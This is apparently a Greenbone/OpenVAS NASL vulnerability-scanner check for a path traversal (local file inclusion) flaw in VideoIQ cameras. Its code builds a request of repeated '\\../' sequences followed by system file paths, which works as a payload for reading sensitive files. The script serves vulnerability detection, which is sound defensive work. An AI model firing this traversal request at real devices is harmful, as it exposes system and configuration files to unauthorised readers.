CPE = "cpe:/a:videoiq:videoiq_camera";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.807356" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2016-08-23 16:18:17 +0530 (Tue, 23 Aug 2016)" );
	script_name( "VideoIQ Camera Local File Inclusion Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_videoiq_camera_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "videoiq/camera/detected" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/40284" );
	script_tag( name: "summary", value: "The host is running VideoIQ Camera
  and is prone to local file disclosure vulnerability" );
	script_tag( name: "vuldetect", value: "Send the crafted http GET request
  and check whether it is able to access sensitive files or not." );
	script_tag( name: "insight", value: "The flaw exists due to an insufficient
  sanitization of user supplied input for file requests." );
	script_tag( name: "impact", value: "Successful exploitation will allow a remote
  attacker to read any file system including file configurations." );
	script_tag( name: "affected", value: "VideoIQ Camera all Versions." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!iqPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: iqPort )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = "/" + crap( data: "\\../", length: 3 * 15 ) + files[file];
	if(http_vuln_check( port: iqPort, url: url, check_header: TRUE, pattern: file )){
		report = http_report_vuln_url( port: iqPort, url: url );
		security_message( port: iqPort, data: report );
		exit( 0 );
	}
}
exit( 99 );

